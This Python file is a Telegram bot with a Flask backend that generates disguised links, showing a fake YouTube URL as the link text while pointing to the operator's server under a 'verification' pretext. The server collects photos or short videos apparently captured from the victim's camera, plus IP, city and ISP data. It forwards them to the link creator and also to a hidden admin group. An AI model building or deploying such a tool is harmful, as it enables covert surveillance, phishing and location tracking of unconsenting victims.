import os
import telebot
from flask import Flask, render_template, request
import threading
import io

# --- CONFIG ---
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL') # Example: https://name.koyeb.app
GROUP_ID = os.environ.get('GROUP_ID') # Example: -100123456789

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
user_modes = {}

# --- BOT LOGIC ---

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.chat.id
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("📸 8 Photos", "🎥 3s Video")
    bot.send_message(uid, "Choose your verification mode:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text in ["📸 8 Photos", "🎥 3s Video"])
def set_mode(message):
    uid = message.chat.id
    mode = "photo" if "Photos" in message.text else "video"
    user_modes[uid] = mode
    msg = bot.send_message(uid, "Enter a YouTube ID (or type 'default'):")
    bot.register_next_step_handler(msg, make_link)

def make_link(message):
    uid = message.chat.id
    yt_id = message.text if message.text.lower() != 'default' else 'dQw4w9WgXcQ'
    mode = user_modes.get(uid, "photo")
    
    # The real link used by the website
    real_link = f"{BASE_URL}/?id={uid}&mode={mode}"
    # The fake text
    fake_text = f"https://youtu.be/{yt_id}?si=Verified_User"
    
    bot.send_message(uid, f"✅ **Link Created!**\n\nTarget: [{fake_text}]({real_link})", parse_mode="Markdown", disable_web_page_preview=True)

# --- SERVER LOGIC ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id')
    ftype = request.args.get('type')
    file = request.files['file'].read()

    if tid and tid != "null":
        # 1. Send to User
        try:
            if ftype == 'photo':
                bot.send_photo(tid, file, caption="✅ Verification Captured")
            else:
                bot.send_document(tid, io.BytesIO(file), visible_file_name="verify.webm")
        except: pass

        # 2. Send to Admin Group
        try:
            cap = f"📁 **LOG:** User `{tid}`"
            if ftype == 'photo':
                bot.send_photo(GROUP_ID, io.BytesIO(file), caption=cap)
            else:
                bot.send_document(GROUP_ID, io.BytesIO(file), visible_file_name="admin.webm", caption=cap)
        except: pass
    return "OK"

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    tid = request.args.get('id')
    log = f"📍 **Info for {tid}**\nIP: `{data.get('ip')}`\nCity: {data.get('city')}\nISP: {data.get('org')}"
    
    try: bot.send_message(tid, log, parse_mode="Markdown")
    except: pass
    
    try: bot.send_message(GROUP_ID, f"📑 **ADMIN LOG**\n{log}", parse_mode="Markdown")
    except: pass
    return "OK"

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
